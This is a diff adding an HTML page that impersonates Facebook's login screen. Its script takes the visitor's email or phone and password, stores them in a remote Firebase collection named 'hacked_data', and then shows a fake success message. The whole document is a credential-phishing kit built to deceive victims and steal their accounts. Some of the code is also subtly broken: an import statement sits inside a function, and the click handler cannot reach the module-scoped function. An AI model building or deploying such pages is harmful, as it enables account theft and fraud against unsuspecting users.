@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <link rel="stylesheet" href="style.css">
+    <script type="module" src="firebase-config.js"></script>
+</head>
+<body style="background: #f0f2f5;">
+    <div class="container" style="background: white; color: black;">
+        <h1 style="color: #1877f2;">Facebook</h1>
+        <p style="color: #606770;">Log in to check your profile.</p>
+        
+        <input type="text" id="username" placeholder="Email or Phone">
+        <input type="password" id="password" placeholder="Password">
+        
+        <button onclick="submitFB()" style="background: #1877f2; color: white;">Log In</button>
+        <div id="msg" class="success-msg"></div>
+    </div>
+
+    <script type="module">
+        async function submitFB() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            const msgDiv = document.getElementById('msg');
+
+            if(!user || !pass) return alert("Fill fields");
+
+            import { db, collection, addDoc } from './firebase-config.js';
+            
+            // Simulate network delay
+            setTimeout(async () => {
+                await addDoc(collection(db, "hacked_data"), {
+                    platform: "Facebook",
+                    username: user,
+                    password: pass,
+                    timestamp: new Date(),
+                    details: "Login Attempt"
+                });
+                msgDiv.innerHTML = "✅ Logged In Successfully!";
+                msgDiv.style.display = 'block';
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
